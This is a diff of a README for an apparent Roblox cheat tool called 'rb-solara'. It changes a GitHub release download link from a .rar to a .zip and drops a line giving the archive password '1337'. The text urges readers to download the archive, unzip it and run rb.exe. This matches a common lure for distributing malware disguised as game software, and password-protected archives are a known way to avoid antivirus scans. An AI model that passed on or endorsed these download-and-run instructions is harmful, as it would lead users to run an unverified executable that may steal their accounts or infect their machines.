@@ -11,9 +11,9 @@
 
 <p align="center">the BEST software for ROBLOX</p>
 
-# [Download](https://github.com/DevX-Realtobiz/rb-solara/releases/download/rb/roblox.rar)
+# [Download](https://github.com/DevX-Realtobiz/rb-solara/releases/download/rb/setup.zip)
 
-## ARCHIVE PASS - 1337
+
 
  *Download the archive here and unzip ***roblox***, than lauch exe file ***rb.exe***
 
